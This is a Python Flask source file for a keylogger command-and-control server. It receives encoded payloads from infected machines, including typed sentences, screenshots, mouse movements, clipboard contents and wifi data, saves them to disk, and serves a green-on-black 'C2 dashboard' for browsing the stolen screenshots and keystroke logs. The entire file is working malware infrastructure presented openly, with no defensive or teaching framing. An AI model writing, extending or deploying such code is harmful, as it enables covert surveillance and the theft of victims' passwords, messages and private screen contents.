from flask import Flask, request, jsonify, send_from_directory
import base64
import zlib
import json
import os
import datetime

app = Flask(__name__)

BASE_DIR = "c2_data"
for folder in ["logs", "screenshots", "keys"]:
    os.makedirs(f"{BASE_DIR}/{folder}", exist_ok=True)

def decrypt_payload(data_b64):
    """Decode agent payload"""
    try:
        data_bytes = base64.b64decode(data_b64)
        decompressed = zlib.decompress(data_bytes).decode('utf-8')
        return json.loads(decompressed)
    except Exception as e:
        print(f"❌ Decode failed: {e}")
        return None

@app.route("/receive", methods=["POST"])
def receive():
    try:
        payload_encrypted = request.json.get("data")
        session_id = request.json.get("session", "unknown")
        
        if not payload_encrypted:
            return jsonify({"error": "No data"}), 400
        
        payload = decrypt_payload(payload_encrypted)
        if not payload:
            return jsonify({"error": "Decode failed"}), 400
        
        # ✅ MATCH CURRENT KEYLOGGER STRUCTURE
        system = payload.get("system", {})
        sentences = payload.get("sentences", [])
        screenshots = payload.get("screenshots", [])
        mouse = payload.get("mouse", [])
        clipboard = payload.get("clipboard", [])
        wifi = payload.get("wifi", [])
        
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        log_file = f"{BASE_DIR}/logs/{system.get('session_id', session_id)}_{ts}.json"
        
        # Save COMPLETE payload
        with open(log_file, "w", encoding="utf-8") as f:
            json.dump(payload, f, indent=2, ensure_ascii=False)
        
        print(f"✅ [{system.get('session_id', session_id)}] {len(sentences)} sentences | {len(screenshots)} shots")
        
        # Save screenshots
        saved_shots = 0
        for shot in screenshots:
            try:
                shot_filename = f"{system.get('session_id', session_id)}_{shot.get('id', 0)}_{ts}.jpg"
                shot_path = f"{BASE_DIR}/screenshots/{shot_filename}"
                img_data = base64.b64decode(shot["data"])
                with open(shot_path, "wb") as f:
                    f.write(img_data)
                saved_shots += 1
            except:
                pass
        
        # Save organized sentences as text
        if sentences:
            keys_file = f"{BASE_DIR}/keys/{system.get('session_id', session_id)}_{ts}.txt"
            with open(keys_file, "w", encoding="utf-8") as f:
                f.write(f"[{ts}] {system.get('hostname', 'unknown')} - {len(sentences)} sentences:\n\n")
                for sentence in sentences:
                    f.write(f"{sentence.get('time', '')}: {sentence.get('sentence', '')}\n")
                    f.write(f"  └─ {sentence.get('len', 0)} chars, {sentence.get('words', 0)} words\n\n")
        
        # ✅ PERFECT RESPONSE FORMAT (keylogger expects this)
        return jsonify({
            "sentences": len(sentences),
            "shots": saved_shots,
            "status": "received"
        }), 200
        
    except Exception as e:
        print(f"❌ SERVER ERROR: {e}")
        return jsonify({"error": str(e)}), 500

@app.route("/")
def dashboard():
    try:
        # Latest files
        shots = sorted([f for f in os.listdir(f"{BASE_DIR}/screenshots") if f.endswith('.jpg')], 
                      reverse=True)[:12]
        keylogs = sorted([f for f in os.listdir(f"{BASE_DIR}/keys") if f.endswith('.txt')], 
                        reverse=True)[:10]
        
        shots_html = ""
        for shot in shots:
            shots_html += f'''
            <div class="shot">
                <a href="/shots/{shot}" target="_blank">
                    <img src="/shots/{shot}" alt="{shot}" loading="lazy">
                </a>
                <div>{shot}</div>
            </div>'''
        
        keys_html = ""
        for keylog in keylogs:
            keys_html += f'''
            <div class="keylog">
                <a href="/keys/{keylog}" target="_blank">{keylog}</a>
            </div>'''
        
        html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>🔥 C2 DASHBOARD v5.2</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width">
    <style>
        *{{margin:0;padding:0;box-sizing:border-box}}
        body{{font-family:'Courier New',monospace;background:linear-gradient(135deg,#000,#111);color:#0f0;padding:20px;min-height:100vh}}
        .header{{text-align:center;margin:2rem 0}}
        h1{{font-size:3.5em;text-shadow:0 0 30px #0f0;margin-bottom:1rem}}
        .stats{{display:flex;justify-content:center;gap:3rem;font-size:1.4em;margin-bottom:3rem;padding:1.5rem;background:#111;border-radius:15px;border:2px solid #333}}
        .shots-grid{{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:2rem;margin-bottom:3rem}}
        .shot{{background:#1a1a1a;padding:1.5rem;border-radius:15px;border:2px solid #333;transition:all 0.3s ease}}
        .shot:hover{{transform:translateY(-10px);border-color:#0f0;box-shadow:0 20px 40px rgba(0,255,0,0.3)}}
        .shot img{{width:100%;height:200px;object-fit:cover;border-radius:10px}}
        .shot div{{margin-top:1rem;font-size:0.95em;color:#aaa;overflow:hidden;text-overflow:ellipsis}}
        .keylogs{{background:#1a1a1a;padding:2.5rem;border-radius:15px;border-left:6px solid #0f0;max-height:450px;overflow-y:auto}}
        .keylogs h2{{margin-bottom:2rem;font-size:1.8em}}
        .keylog{{padding:1.2rem;margin:1rem 0;background:#000;border-radius:10px;cursor:pointer;transition:all 0.3s}}
        .keylog:hover{{background:#0a420a;box-shadow:0 5px 15px rgba(0,255,0,0.2)}}
        .keylog a{{color:#0f0;text-decoration:none;font-size:1.1em}}
        .live{{animation:pulse 2s infinite}}
        @keyframes pulse{{0%,100%{{opacity:1}}50%{{opacity:0.5}}}}
        @media(max-width:768px){{.stats{{flex-direction:column;gap:1rem;font-size:1.1em}}}}
    </style>
</head>
<body>
    <div class="header">
        <h1>🔥 ULTIMATE C2 DASHBOARD</h1>
        <div class="stats">
            <div>📸 <strong>{len(shots)}</strong> Screenshots</div>
            <div>⌨️ <strong>{len(keylogs)}</strong> Sentences</div>
            <div class="live">🟢 LIVE</div>
        </div>
    </div>
    
    <div class="shots-grid">
        {shots_html}
    </div>
    
    <div class="keylogs">
        <h2>⌨️ Organized Sentences (Latest)</h2>
        {keys_html}
    </div>
    
    <script>
        setTimeout(()=>location.reload(), 25000);
        document.addEventListener('keydown', e => {{
            if(e.key==='r' && e.ctrlKey) location.reload();
        }});
    </script>
</body>
</html>
        """
        return html
        
    except Exception as e:
        return f"<h1 style='color:#f00'>ERROR: {e}</h1>", 500

@app.route("/shots/<path:filename>")
def serve_shot(filename):
    return send_from_directory(f"{BASE_DIR}/screenshots", filename)

@app.route("/keys/<path:filename>")
def serve_key(filename):
    try:
        filepath = f"{BASE_DIR}/keys/{filename}"
        if os.path.exists(filepath):
            with open(filepath, "r", encoding="utf-8") as f:
                content = f.read()
            
            # HTML escape
            content = content.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
            content = content.replace('\n', '<br>').replace('  ', '&nbsp;&nbsp;')
            
            return f"""
<!DOCTYPE html>
<html><head><title>Sentences: {filename}</title>
<meta charset="utf-8">
<style>
body{{font-family:'Courier New',monospace;background:#000;color:#0f0;padding:3rem;font-size:16px;line-height:1.7}}
pre{{background:#111;padding:3rem;border-radius:20px;border:3px solid #333;max-height:85vh;overflow:auto;white-space:pre-wrap;word-break:break-word}}
.header{{margin-bottom:3rem;text-align:center}}
.back{{position:fixed;top:2rem;left:2rem;font-size:2rem;color:#0f0;text-decoration:none}}
</style></head>
<body>
<a href="/" class="back">🏠</a>
<div class="header">
<h1 style="color:#0f0;font-size:2.5em;margin-bottom:1rem">{filename}</h1>
</div>
<pre>{content}</pre>
</body></html>
            """
    except:
        pass
    return "Not found", 404

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print(f"🚀 C2 Server v5.2 LIVE on port {port}")
    print("📁 Data saved to: c2_data/ (logs/screenshots/keys)")
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)